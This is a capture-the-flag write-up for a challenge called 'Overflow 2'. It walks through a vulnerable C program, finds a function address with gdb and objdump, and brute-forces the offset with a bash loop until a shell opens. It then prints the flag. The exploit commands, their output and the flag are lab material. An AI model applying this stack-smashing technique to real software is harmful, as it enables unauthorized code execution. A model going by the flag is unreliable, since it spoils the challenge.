__Overflow 2__
================


_John Hammond_ | _Wednesday, December 30th, 2015_ 


> This problem has a buffer overflow vulnerability! Can you get a shell? You can solve this problem interactively here, and the source can be found here. 


----------

Another [buffer overflow] challenge, just a step up from the previous [Overflow 1](../overflow_1). I honestly don't see too much of a real difference in this one than the other one... you are writing over a return address at least this time, so you have to overflow past the [base pointer] register and the size of the [stack frame]. We need to know the memory address of the function we're want to return to, though, so that will be our first priority.

Let's take a look at the [source code](overflow2.c) and see what we can do.

``` c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* This never gets called! */
void give_shell(){
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
    system("/bin/sh -i");
}

void vuln(char *input){
    char buf[16];
    strcpy(buf, input);
}

int main(int argc, char **argv){
    if (argc > 1)
        vuln(argv[1]);
    return 0;
}

```

Our `give_shell` function never gets called, eh? Well, let's change that! That is the function we need to set our return address to. So we need to know the address of that function!

You can do this with either [`gdb`][gdb] or even [`objdump`][objdump]. Here's how to do it either way, just so you know...


GDB
----

``` bash
$ gdb overflow2
(gdb) x &give_shell
0x80484ad <give_shell>: 0x83e58955
``` 

... and the address is the [hex] value on the very left, `0x80484ad`

objdump
-----

``` bash
$ objdump -d overflow2|grep "give_shell"
080484ad <give_shell>:
```

... literally just disassemble the program and search for the function.  

Now to overflow!
--------

Now that we've got our address, we've got to smash [the stack]. We supply our input as an [argument], and it looks like the size of our buffer is `16`. Since now we're overwriting a function's return address, we have to account for the [stack frame] and the [base pointer] register `$ebp` on that lies before the return address on the [stack address]. 

Keep in mind that the [base pointer] `$ebp` register is still _within_ the [stack frame]. The 'size of the [stack frame]' still includes the length of the `$ebp` register, but we know the size of the [base pointer] to always be `4`, so we include that in our offset. What we still don't really know is the size of the [stack frame] _remaining_ after we've accounted for the [base pointer]'s `4` bytes.

But, the [stack frame] is hard to judge. That is variable, the size of it may be different from program to program. I typically find it to be `8`, but, we'll never really know. 

If you are in a situation where you can't really check [`dmesg`][dmesg] to see where a program is receiving a [segfault] and you aren't able to use the `pattern.py` tool from within [`sploit-tools`][sploit-tools], you can still try and brute force the offset.

Realistically, we could use these tools for this challenge (I'm referring to [`dmesg`][dmesg] and [`sploit-tools`][sploit-tools]) -- but it honestly seems like too much work for this challenge. We can brute force it with ease. 

Admittedly it is easy to see within the simulator page online that the remaining size of the [stack frame] is 8 bytes (so our offset would be `16 (size of buffer) + 4 (size of ebp) + 8 (remaining size of stack frame) = 20`), but, say we're in a situation we did not easily know that. Let's just brute force the offset.

We can loop within [`bash`] to setup something that will just try to get our shell. Since we know at least that the size of the buffer and [base pointer] add up to `20`, let's start testing our offset from there.

So here's our exploit:

```
$ for i in {20..50}; do echo -n "$i "; ./overflow2 `python -c "print 'A'*$i + '\xad\x84\x04\x08'"`; done
```

I use the `echo` command within our loop just to check what offset we are on, and I just choose arbitrarily chose to go up to 50 (we could make this more, but if we find to be too little we may not find our [shell]). 

After some hammering, we find that offset `28` successfully gets our [buffer overflow]!

```
$ for i in {20..50}; do echo -n "$i "; ./overflow2 `python -c "print 'A'*$i + '\xad\x84\x04\x08'"`; done
20 Segmentation fault (core dumped)     
21 Segmentation fault (core dumped)            
22 Segmentation fault (core dumped)            
23 Segmentation fault (core dumped)            
24 Segmentation fault (core dumped)            
25 Segmentation fault (core dumped)            
26 Segmentation fault (core dumped)            
27 Segmentation fault (core dumped)            
28 $ ls                                        
flag.txt  Makefile  overflow2  overflow2.c                                 
$ cat flag.txt                          
controlling_%eip_feels_great                                        
```

Got our [shell], and got our [flag]!
